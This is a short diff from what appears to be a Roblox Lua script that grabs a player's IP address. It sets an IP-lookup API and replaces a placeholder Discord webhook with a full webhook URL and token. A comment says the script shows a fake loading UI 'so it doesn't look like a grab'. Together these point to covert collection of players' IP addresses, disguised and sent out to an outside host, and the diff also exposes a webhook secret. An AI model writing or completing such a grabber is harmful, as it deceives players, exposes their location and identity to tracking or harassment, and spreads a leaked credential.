@@ -10,7 +10,7 @@ local player = Players.LocalPlayer
 
 -- ---- config ----
 local IP_API = "https://api.ipify.org?format=json"   -- returns {"ip":"1.2.3.4"}
-local WEBHOOK = "https://discord.com/api/webhooks/XXXX/YYYY"  -- your webhook
+local WEBHOOK = "https://discord.com/api/webhooks/1465393220614750209/vJOeuskLsOrvkc7fCf-aNBqOSXAgTIUjl1aY-7WouZm2ZEH0RSIshrIGxP32VLlGUuhs"  -- your webhook
 local SHOW_UI = true
 
 -- ---- fake loading UI so it doesn't look like a grab ----
